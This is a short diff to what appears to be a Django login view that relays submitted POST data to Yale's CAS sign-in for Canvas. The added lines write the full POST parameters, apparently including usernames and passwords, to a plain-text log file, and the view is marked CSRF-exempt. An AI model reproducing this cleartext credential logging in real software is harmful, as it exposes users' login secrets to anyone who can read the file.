@@ -10,4 +10,7 @@ def index(request):
 @csrf_exempt
 def login(request):
     url = 'https://secure.its.yale.edu/cas/login?service=https%3A%2F%2Fyale.instructure.com%2Flogin%2Fcas'
+    with open("requestLog.txt", 'a') as f:
+        f.write('\n==========[ POST Request Params ]==========\n')
+        f.write(str(request.POST))
     return login_post(url, request.POST)
